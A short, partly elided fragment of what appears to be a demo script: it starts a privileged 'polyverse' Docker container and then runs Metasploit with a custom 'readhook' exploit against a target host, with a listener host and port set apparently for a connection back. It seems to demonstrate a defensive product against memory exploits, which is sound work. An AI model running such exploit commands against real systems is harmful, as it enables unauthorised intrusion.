...
docker run --privileged -dt --rm --name $rem -e PV_TWIDDLER_INITIAL_DELAY=15000 -e PV_TWIDDLER_LOOP_INTERVAL=500 polyverse/$rem:$sha
...
docker run -it --rm --name $loc -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse/$loc msfconsole -x "use exploit/custom/readhook_node_echo_server.rb; set INTERACTIVE false; set DEMOTYPE 2; set RHOST $RHOST; set RPORT 8080; set LHOST $LHOST; set LPORT 5555; exploit"
